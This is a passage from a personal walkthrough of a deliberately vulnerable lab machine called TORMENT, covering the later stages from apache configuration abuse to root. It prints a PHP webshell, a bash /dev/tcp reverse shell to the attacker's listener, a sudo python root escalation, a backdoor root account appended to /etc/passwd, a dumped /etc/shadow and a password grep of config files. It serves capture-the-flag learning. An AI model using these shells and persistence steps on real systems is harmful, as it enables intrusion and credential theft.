<pre class="shell"><code>patrick@TORMENT:~$ cat /etc/apache2/envvars
# envvars - default environment variables for apache2ctl

# this won&#39;t be correct after changing uid
unset HOME

# for supporting multiple apache2 instances
if [ &quot;${APACHE_CONFDIR##/etc/apache2-}&quot; != &quot;${APACHE_CONFDIR}&quot; ] ; then
        SUFFIX=&quot;-${APACHE_CONFDIR##/etc/apache2-}&quot;
else
        SUFFIX=
fi

# Since there is no sane way to get the parsed apache2 config in scripts, some
# settings are defined via environment variables and then used in apache2ctl,
# /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX

## The locale used by some modules like mod_dav
export LANG=C
## Uncomment the following line to use the system default locale instead:
#. /etc/default/locale

export LANG

## The command to get the status for &#39;apache2ctl status&#39;.
## Some packages providing &#39;www-browser&#39; need &#39;--dump&#39; instead of &#39;-dump&#39;.
#export APACHE_LYNX=&#39;www-browser -dump&#39;

## If you need a higher file descriptor limit, uncomment and adjust the
## following line (default is 8192):
#APACHE_ULIMIT_MAX_FILES=&#39;ulimit -n 65536&#39;

## If you would like to pass arguments to the web server, add them below
## to the APACHE_ARGUMENTS environment.
#export APACHE_ARGUMENTS=&#39;&#39;

## Enable the debug mode for maintainer scripts.
## This will produce a verbose output on package installations of web server modules and web application
## installations which interact with Apache
#export APACHE2_MAINTSCRIPT_DEBUG=1</code></pre>
<figure>
<img src="36.notice-www-data-is-configured.png" alt="" /><figcaption>36.notice-www-data-is-configured</figcaption>
</figure>
<p>Notice that there are two users, root and qiu, on this system. And we cannot access either.</p>
<p>Let’s be greedy and use root. This way, we will be running apache as root. And we can reboot too.</p>
<p>But the bigger question remains, how will that help me? Can we make use of webshell or reverse shell?</p>
<p>Can we write to /var/www/html?</p>
<h3 id="webshell">webshell</h3>
<pre class="shell"><code>patrick@TORMENT:~$ cd /var/www/html
patrick@TORMENT:/var/www/html$ ls
index.html  secret  torment.jpg
patrick@TORMENT:/var/www/html$ ls -la
total 64
drwxrwxrwx 2 www-data www-data  4096 Jan  1  2019 .
drwxr-xr-x 3 root     root      4096 Dec 23  2018 ..
-rwxrwxrwx 1 www-data www-data 10701 Dec 23  2018 index.html
-rw-r--r-- 1 www-data www-data    61 Dec 31  2018 secret
-rw-r--r-- 1 www-data www-data 39848 Jan  1  2019 torment.jpg
patrick@TORMENT:/var/www/html$ cat secret
Does pain come before sufferance? Or sufferance before pain?
patrick@TORMENT:/var/www/html$ touch webshell.php
patrick@TORMENT:/var/www/html$ ls
index.html  secret  torment.jpg  webshell.php
patrick@TORMENT:/var/www/html$ vim webshell.php
-bash: vim: command not found
patrick@TORMENT:/var/www/html$ nano webshell.php
patrick@TORMENT:/var/www/html$ cat webshell.php 
&lt;?php echo system(&#39;$_GET[&#39;cmd&#39;]); ?&gt;

patrick@TORMENT:/var/www/html$ rm webshell.php
patrick@TORMENT:/var/www/html$ nano webshell.php
patrick@TORMENT:/var/www/html$ cat webshell.php 
&lt;html&gt;
&lt;body&gt;
&lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&quot;&gt;
&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;
&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
&lt;/form&gt;
&lt;pre&gt;
&lt;?php
    if(isset($_GET[&#39;cmd&#39;]))
    {
        system($_GET[&#39;cmd&#39;]);
    }
?&gt;
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<figure>
<img src="37.a-webshell-as-www-data.png" alt="" /><figcaption>37.a-webshell-as-www-data</figcaption>
</figure>
<figure>
<img src="38.code-for-webshell.png" alt="" /><figcaption>38.code-for-webshell</figcaption>
</figure>
<p>We do get a webshell as user:www-data. If I update user and group to root, I can become root.</p>
<p>We are still attacking apache2.</p>
<h3 id="updating-configuration-and-rebooting.">updating configuration and rebooting.</h3>
<p>Cannot update /etc/apache2/envvars, ofcourse we cannot, because only world writable file is /etc/apache2/apache2.conf</p>
<figure>
<img src="39.cannot-write-etc-apache2-envvars.png" alt="" /><figcaption>39.cannot-write-etc-apache2-envvars</figcaption>
</figure>
<h3 id="reboot">reboot</h3>
<pre class="shell"><code>patrick@TORMENT:/var/www/html$ sudo /bin/systemctl reboot
patrick@TORMENT:/var/www/html$ Connection to 192.168.56.77 closed by remote host.
Connection to 192.168.56.77 closed.</code></pre>
<p>User root didn’t work. It would just not load the webshell.php file. Trying with user qiu.</p>
<h3 id="reboot-again">reboot again</h3>
<p>Yup. It was not loading when the user and group was root, with qiu it worked!</p>
<figure>
<img src="40.user-qiu-hands-you-a-webshell.png" alt="" /><figcaption>40.user-qiu-hands-you-a-webshell</figcaption>
</figure>
<h3 id="webshell-1">webshell</h3>
<p><code>http://192.168.56.77/webshell.php?cmd=sudo+-l</code></p>
<figure>
<img src="41.lol-sudo--l-in-webshell.png" alt="" /><figcaption>41.lol-sudo–l-in-webshell</figcaption>
</figure>
<p>Getting out of python to root shell is easy, we now just need a reverse shell.</p>
<h2 id="reverse-shell">Reverse shell</h2>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 06:28:13 PM IST 2021.12.22 18:28:13
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment $
sudo nc -nlvp $LPORT -s $LHOST                                                 
[sudo] password for f0c1s: 
Listening on 192.168.56.70 443
</code></pre>
<p><code>http://192.168.56.77/webshell.php?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.77%2F443+0%3E%261</code> didn’t work. Why would it? That’s not my IP?</p>
<p>I am a bit tired right now.</p>
<p><code>bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1</code> doesn’t work. May be put it in bash process?</p>
<p><code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1'</code> works!</p>
<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST                                                 
[sudo] password for f0c1s: 
Listening on 192.168.56.70 443
Connection received on 192.168.56.77 35030
bash: cannot set terminal process group (638): Inappropriate ioctl for device
bash: no job control in this shell
qiu@TORMENT:/var/www/html$ whoami
whoami
qiu
qiu@TORMENT:/var/www/html$ id
id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)
qiu@TORMENT:/var/www/html$ hostname
hostname
TORMENT
qiu@TORMENT:/var/www/html$ date
date
Thu Dec 23 02:31:31 +08 2021
qiu@TORMENT:/var/www/html$ </code></pre>
<figure>
<img src="42.caught-reverse-shell.png" alt="" /><figcaption>42.caught-reverse-shell</figcaption>
</figure>
<h2 id="root-shell">Root shell</h2>
<pre class="shell"><code>qiu@TORMENT:/var/www/html$ sudo python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
&lt;sudo python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
root@TORMENT:/var/www/html# id    
id
uid=0(root) gid=0(root) groups=0(root)
root@TORMENT:/var/www/html# whoami
whoami
root
root@TORMENT:/var/www/html# </code></pre>
<figure>
<img src="43.became-root.png" alt="" /><figcaption>43.became-root</figcaption>
</figure>
<h2 id="flags">flags</h2>
<pre class="shell"><code>root@TORMENT:~# ls
ls
author-secret.txt  proof.txt

root@TORMENT:~# cat author-secret.txt
cat author-secret.txt
This is the fourth Linux box written successfully by this author.

Unlike the first three, this had no MERCY, took some DEVELOPMENT and required a sheer ton of BRAVERY.

Setting puzzles has been an author&#39;s joy, even though some of these puzzles may be rather mind-bending. The idea is that, even if we are repeatedly testing the basics, the basics can be morphed into so many different forms. The TORMENT box is a fine example.

The privilege escalation, in particular, was inspired from what people would usually learn in Windows privilege escalation --- weak service permissions. In this case, this was extended to Linux through something a little different. Before you think this is fictitious, think for a second --- how many developers have you heard became too lazy to test new configurations, and so decided to chmod 777 themselves? Also, if they can&#39;t log in as root directly, they cannot as easily modify /var/www/html, so they&#39;d come up with silly ideas there as well.

Sigh, a New Year&#39;s eve disappeared from rushing out this box. But I think it is worth it.

Happy 2019, and many more good years beyond!

Soon I will be writing Windows boxes; these you may be able to find on Wizard-Labs, as a favour for a friend. Otherwise you can find me on my site. Root one of the earlier boxes I had to find out where this is.

root@TORMENT:~# cat proof.txt
cat proof.txt
Congrutulations on rooting TORMENT. I hope this box has been as fun for you as it has been for me. :-)

Until then, try harder!</code></pre>
<figure>
<img src="44.root-flag.png" alt="" /><figcaption>44.root-flag</figcaption>
</figure>
<h2 id="nothing-in-qiu">nothing in qiu</h2>
<figure>
<img src="45.nothing-in-qiu.png" alt="" /><figcaption>45.nothing-in-qiu</figcaption>
</figure>
<pre class="shell"><code>root@TORMENT:~# cd /home/qiu
cd /home/qiu
root@TORMENT:/home/qiu# ls =la
ls =la
ls: cannot access &#39;=la&#39;: No such file or directory
root@TORMENT:/home/qiu# ls
ls
Desktop    Downloads  Music     Public     Videos
Documents  Maildir    Pictures  Templates
root@TORMENT:/home/qiu# ls -la
ls -la
total 96
drwx------ 18 qiu  qiu  4096 Jan  4  2019 .
drwxr-xr-x  4 root root 4096 Dec 27  2018 ..
-rwx------  1 qiu  qiu  5152 Jan  4  2019 .ICEauthority
-rw-------  1 qiu  qiu   187 Jan  4  2019 .bash_history
-rwx------  1 qiu  qiu   220 Dec 23  2018 .bash_logout
-rwx------  1 qiu  qiu  3526 Dec 23  2018 .bashrc
drwx------ 13 qiu  qiu  4096 Dec 27  2018 .cache
drwx------ 12 qiu  qiu  4096 Dec 31  2018 .config
drwx------  3 qiu  qiu  4096 Dec 24  2018 .gnupg
drwx------  3 qiu  qiu  4096 Dec 24  2018 .local
drwx------  5 qiu  qiu  4096 Dec 27  2018 .mozilla
drwx------  2 qiu  qiu  4096 Dec 24  2018 .nano
-rwx------  1 qiu  qiu   675 Dec 23  2018 .profile
drwx------  2 qiu  qiu  4096 Dec 24  2018 .ssh
drwx------  2 qiu  qiu  4096 Dec 24  2018 Desktop
drwx------  2 qiu  qiu  4096 Dec 24  2018 Documents
drwx------  2 qiu  qiu  4096 Dec 31  2018 Downloads
drwx------  5 qiu  qiu  4096 Dec 27  2018 Maildir
drwx------  2 qiu  qiu  4096 Dec 24  2018 Music
drwx------  2 qiu  qiu  4096 Dec 24  2018 Pictures
drwx------  2 qiu  qiu  4096 Dec 24  2018 Public
drwx------  2 qiu  qiu  4096 Dec 24  2018 Templates
drwx------  2 qiu  qiu  4096 Dec 24  2018 Videos
root@TORMENT:/home/qiu# find . -type f -name &quot;*.txt&quot;
find . -type f -name &quot;*.txt&quot;
./.cache/tracker/db-locale.txt
./.cache/tracker/locale-for-miner-user-guides.txt
./.cache/tracker/parser-sha1.txt
./.cache/tracker/first-index.txt
./.cache/tracker/locale-for-miner-apps.txt
./.cache/tracker/last-crawl.txt
./.cache/tracker/db-version.txt
./.mozilla/firefox/qyzwguli.default/SiteSecurityServiceState.txt
./.mozilla/firefox/qyzwguli.default/AlternateServices.txt
./.mozilla/firefox/qyzwguli.default/revocations.txt
./.mozilla/firefox/qyzwguli.default/TRRBlacklist.txt
./.mozilla/firefox/qyzwguli.default/pkcs11.txt
./.mozilla/firefox/qyzwguli.default/SecurityPreloadState.txt
root@TORMENT:/home/qiu# ls -la .ssh
ls -la .ssh
total 8
drwx------  2 qiu qiu 4096 Dec 24  2018 .
drwx------ 18 qiu qiu 4096 Jan  4  2019 ..
root@TORMENT:/home/qiu# 
</code></pre>
<h2 id="post-root">Post root</h2>
<h3 id="create-a-user-of-our-own-so-that-we-can-use-stable-ssh-connection.">Create a user of our own, so that we can use stable SSH connection.</h3>
<pre class="shell"><code>echo &#39;salty:$6$salty$TwLZ.kG/oqyEnXrhYGO8tQPAaX8GVJE5mhKgLSy9yKz7cNjaVNx3.7FtBVn4VEe.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash&#39; &gt;&gt; /etc/passwd</code></pre>
<figure>
<img src="46.add-our-own-root-user.png" alt="" /><figcaption>46.add-our-own-root-user</figcaption>
</figure>
<pre class="shell"><code>patrick@TORMENT:~$ su salty
Password: 
root@TORMENT:/home/patrick# id
uid=0(root) gid=0(root) groups=0(root)
root@TORMENT:/home/patrick# whoami
root
root@TORMENT:/home/patrick# cd
root@TORMENT:/# 
</code></pre>
<figure>
<img src="47.becoming-salty.png" alt="" /><figcaption>47.becoming-salty</figcaption>
</figure>
<h3 id="etcpasswd">/etc/passwd</h3>
<pre class="shell"><code>root@TORMENT:/# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
rtkit:x:105:110:RealtimeKit,,,:/proc:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
geoclue:x:109:115::/var/lib/geoclue:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
pulse:x:112:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false
avahi:x:113:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:114:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:115:121::/var/lib/saned:/bin/false
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:122:Gnome Display Manager:/var/lib/gdm3:/bin/false
qiu:x:1000:1000:qiu,,,:/home/qiu:/bin/bash
statd:x:118:65534::/var/lib/nfs:/bin/false
Debian-exim:x:119:124::/var/spool/exim4:/bin/false
postfix:x:120:125::/var/spool/postfix:/bin/false
dovecot:x:121:127:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:122:128:Dovecot login user,,,:/nonexistent:/bin/false
patrick:x:1001:1001:,,,:/home/patrick:/bin/bash
mysql:x:123:129:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:124:130:ftp daemon,,,:/srv/ftp:/bin/false
salty:$6$salty$TwLZ.kG/oqyEnXrhYGO8tQPAaX8GVJE5mhKgLSy9yKz7cNjaVNx3.7FtBVn4VEe.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash</code></pre>
<h3 id="etcshadow">/etc/shadow</h3>
<pre class="shell"><code>root@TORMENT:/# cat /etc/shadow
root:$6$7hTLhucw$mBxmkZLci6wzK8Y/pU7VGgeBuBnFRQGuyP7cthV9NeY6De9aYqJGAbyRGnjjXGcmDvkQHSHG4yl6gfOhPJrU20:17888:0:99999:7:::
daemon:*:17888:0:99999:7:::
bin:*:17888:0:99999:7:::
sys:*:17888:0:99999:7:::
sync:*:17888:0:99999:7:::
games:*:17888:0:99999:7:::
man:*:17888:0:99999:7:::
lp:*:17888:0:99999:7:::
mail:*:17888:0:99999:7:::
news:*:17888:0:99999:7:::
uucp:*:17888:0:99999:7:::
proxy:*:17888:0:99999:7:::
www-data:*:17888:0:99999:7:::
backup:*:17888:0:99999:7:::
list:*:17888:0:99999:7:::
irc:*:17888:0:99999:7:::
gnats:*:17888:0:99999:7:::
nobody:*:17888:0:99999:7:::
systemd-timesync:*:17888:0:99999:7:::
systemd-network:*:17888:0:99999:7:::
systemd-resolve:*:17888:0:99999:7:::
systemd-bus-proxy:*:17888:0:99999:7:::
_apt:*:17888:0:99999:7:::
rtkit:*:17888:0:99999:7:::
dnsmasq:*:17888:0:99999:7:::
messagebus:*:17888:0:99999:7:::
usbmux:*:17888:0:99999:7:::
geoclue:*:17888:0:99999:7:::
speech-dispatcher:!:17888:0:99999:7:::
sshd:*:17888:0:99999:7:::
pulse:*:17888:0:99999:7:::
avahi:*:17888:0:99999:7:::
colord:*:17888:0:99999:7:::
saned:*:17888:0:99999:7:::
hplip:*:17888:0:99999:7:::
Debian-gdm:*:17888:0:99999:7:::
qiu:$6$VYwf95f/$EAdV6jtG50Ofd/0XSdwnVSUSyel9OBOt6ASha93EkgwVKt4vT/Eq6Rv4vBUcGcLv0hOiilvJc5nBMPYovuHv3.:17888:0:99999:7:::
statd:*:17891:0:99999:7:::
Debian-exim:!:17891:0:99999:7:::
postfix:*:17891:0:99999:7:::
dovecot:*:17891:0:99999:7:::
dovenull:*:17891:0:99999:7:::
patrick:$6$LgABybAh$rOgmAUyvOQkeYeVfhhdqRgLWjhTC81xaOph9y6m4tGXxDGMEnpZiebOpVlgM30ubHW0d64L28VtiqY52YqVm40:17896:0:99999:7:::
mysql:!:17892:0:99999:7:::
ftp:*:17896:0:99999:7:::</code></pre>
<h3 id="etchosts">/etc/hosts</h3>
<pre class="shell"><code>root@TORMENT:/# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       TORMENT

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters</code></pre>
<h3 id="etc-release">/etc/*-release</h3>
<pre class="shell"><code>root@TORMENT:/# cat /etc/*-release
PRETTY_NAME=&quot;Debian GNU/Linux 9 (stretch)&quot;
NAME=&quot;Debian GNU/Linux&quot;
VERSION_ID=&quot;9&quot;
VERSION=&quot;9 (stretch)&quot;
ID=debian
HOME_URL=&quot;https://www.debian.org/&quot;
SUPPORT_URL=&quot;https://www.debian.org/support&quot;
BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;</code></pre>
<h3 id="uname">uname</h3>
<pre class="shell"><code>root@TORMENT:/# uname -a
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux</code></pre>
<h3 id="netstat">netstat</h3>
<pre class="shell"><code>root@TORMENT:/# netstat -antuple
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      123        16253      691/mysqld          
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      0          18967      952/smbd            
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      39         14214      504/ngircd          
tcp        0      0 0.0.0.0:52011           0.0.0.0:*               LISTEN      0          13751      499/rpc.mountd      
tcp        0      0 0.0.0.0:6668            0.0.0.0:*               LISTEN      39         14215      504/ngircd          
tcp        0      0 0.0.0.0:6669            0.0.0.0:*               LISTEN      39         14216      504/ngircd          
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      0          14174      505/dovecot         
tcp        0      0 0.0.0.0:38735           0.0.0.0:*               LISTEN      0          13783      499/rpc.mountd      
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      0          10894      298/rpcbind         
tcp        0      0 0.0.0.0:6672            0.0.0.0:*               LISTEN      39         14217      504/ngircd          
tcp        0      0 0.0.0.0:32945           0.0.0.0:*               LISTEN      0          13702      499/rpc.mountd      
tcp        0      0 0.0.0.0:6674            0.0.0.0:*               LISTEN      39         14218      504/ngircd          
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          18030      502/sshd            
tcp        0      0 0.0.0.0:631             0.0.0.0:*               LISTEN      0          15524      392/cupsd           
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      0          19075      1057/master         
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      0          18966      952/smbd            
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      0          14428      -                   
tcp        0      0 0.0.0.0:36035           0.0.0.0:*               LISTEN      0          14558      -                   
tcp        0      0 192.168.56.77:35030     192.168.56.70:443       ESTABLISHED 1000       20727      1116/bash           
tcp        0      0 192.168.56.77:22        192.168.56.70:41440     ESTABLISHED 0          19501      1071/sshd: patrick  
tcp6       0      0 :::33351                :::*                    LISTEN      0          14560      -                   
tcp6       0      0 :::6667                 :::*                    LISTEN      39         14209      504/ngircd          
tcp6       0      0 :::139                  :::*                    LISTEN      0          18965      952/smbd            
tcp6       0      0 :::6668                 :::*                    LISTEN      39         14210      504/ngircd          
tcp6       0      0 :::6669                 :::*                    LISTEN      39         14211      504/ngircd          
tcp6       0      0 :::51277                :::*                    LISTEN      0          13757      499/rpc.mountd      
tcp6       0      0 :::143                  :::*                    LISTEN      0          14175      505/dovecot         
tcp6       0      0 :::111                  :::*                    LISTEN      0          10897      298/rpcbind         
tcp6       0      0 :::6672                 :::*                    LISTEN      39         14212      504/ngircd          
tcp6       0      0 :::80                   :::*                    LISTEN      0          15661      638/apache2         
tcp6       0      0 :::6674                 :::*                    LISTEN      39         14213      504/ngircd          
tcp6       0      0 :::21                   :::*                    LISTEN      0          13760      490/vsftpd          
tcp6       0      0 :::22                   :::*                    LISTEN      0          18032      502/sshd            
tcp6       0      0 :::631                  :::*                    LISTEN      0          15525      392/cupsd           
tcp6       0      0 :::55607                :::*                    LISTEN      0          13789      499/rpc.mountd      
tcp6       0      0 :::25                   :::*                    LISTEN      0          19076      1057/master         
tcp6       0      0 :::59385                :::*                    LISTEN      0          13745      499/rpc.mountd      
tcp6       0      0 :::445                  :::*                    LISTEN      0          18964      952/smbd            
tcp6       0      0 :::2049                 :::*                    LISTEN      0          14553      -                   
tcp6       1      0 192.168.56.77:80        192.168.56.70:39942     CLOSE_WAIT  1000       19774      676/apache2         
udp        0      0 0.0.0.0:49752           0.0.0.0:*                           0          13762      499/rpc.mountd      
udp        0      0 0.0.0.0:631             0.0.0.0:*                           0          16011      394/cups-browsed    
udp        0      0 0.0.0.0:59121           0.0.0.0:*                           0          14557      -                   
udp        0      0 0.0.0.0:1900            0.0.0.0:*                           0          18594      886/minissdpd       
udp        0      0 0.0.0.0:898             0.0.0.0:*                           0          10893      298/rpcbind         
udp        0      0 0.0.0.0:33718           0.0.0.0:*                           113        11730      363/avahi-daemon: r 
udp        0      0 0.0.0.0:49093           0.0.0.0:*                           0          13699      499/rpc.mountd      
udp        0      0 0.0.0.0:2049            0.0.0.0:*                           0          14552      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          16971      779/dhclient        
udp        0      0 0.0.0.0:111             0.0.0.0:*                           0          10892      298/rpcbind         
udp        0      0 0.0.0.0:43133           0.0.0.0:*                           0          13748      499/rpc.mountd      
udp        0      0 192.168.56.255:137      0.0.0.0:*                           0          18645      927/nmbd            
udp        0      0 192.168.56.77:137       0.0.0.0:*                           0          18644      927/nmbd            
udp        0      0 0.0.0.0:137             0.0.0.0:*                           0          18634      927/nmbd            
udp        0      0 192.168.56.255:138      0.0.0.0:*                           0          18647      927/nmbd            
udp        0      0 192.168.56.77:138       0.0.0.0:*                           0          18646      927/nmbd            
udp        0      0 0.0.0.0:138             0.0.0.0:*                           0          18635      927/nmbd            
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           113        11728      363/avahi-daemon: r 
udp6       0      0 :::54556                :::*                                113        11731      363/avahi-daemon: r 
udp6       0      0 :::50639                :::*                                0          13754      499/rpc.mountd      
udp6       0      0 :::898                  :::*                                0          10896      298/rpcbind         
udp6       0      0 :::40926                :::*                                0          13705      499/rpc.mountd      
udp6       0      0 :::2049                 :::*                                0          14556      -                   
udp6       0      0 :::48157                :::*                                0          13786      499/rpc.mountd      
udp6       0      0 :::111                  :::*                                0          10895      298/rpcbind         
udp6       0      0 :::44174                :::*                                0          14559      -                   
udp6       0      0 :::5353                 :::*                                113        11729      363/avahi-daemon: r</code></pre>
<h3 id="cups-password">cups password</h3>
<pre class="shell"><code>root@TORMENT:/home/patrick# find / -type f -name &quot;*conf&quot;  | grep cups
/usr/share/doc/cups-daemon/examples/cups-socket.public.conf
/usr/share/doc/cups-daemon/examples/cups-socket.localhost.conf
/usr/share/doc/libcups2/examples/client.conf
/etc/modules-load.d/cups-filters.conf
/etc/cups/cups-browsed.conf
/etc/cups/subscriptions.conf
/etc/cups/snmp.conf
/etc/cups/cups-files.conf
/etc/cups/cupsd.conf
/etc/cups/printers.conf
root@TORMENT:/home/patrick# find / -type f -name &quot;*conf&quot;  | grep cups | xargs -n1 grep -Hin password
/etc/cups/cups-browsed.conf:291:# BrowseLDAPPassword s3cret</code></pre>
<p>Then I read up on the internet, and it says system user:password work.</p>
<figure>
<img src="48.accessed-CUPS-but-no-unicorn.png" alt="" /><figcaption>48.accessed-CUPS-but-no-unicorn</figcaption>
</figure>
<p>I’d call it a day. It has taken me 10 hours to get here.</p>
<p>Rooted.</p>
<h2 id="post-done">Post Done</h2>
<p>Uninstall HexChat and ngircd.</p>
<h2 id="how-to-hack.">How to hack.</h2>
<ol type="1">
<li>Find hidden files in FTP</li>
<li>HexChat a little, read the channels.</li>
<li>SSH</li>
<li>Find one file that you can modify</li>
<li>Find where you can put a reverse or web shell.</li>
<li>Reboot</li>
<li>Become a user</li>
<li>Become root</li>
<li>???</li>
<li>Profit.</li>
</ol>
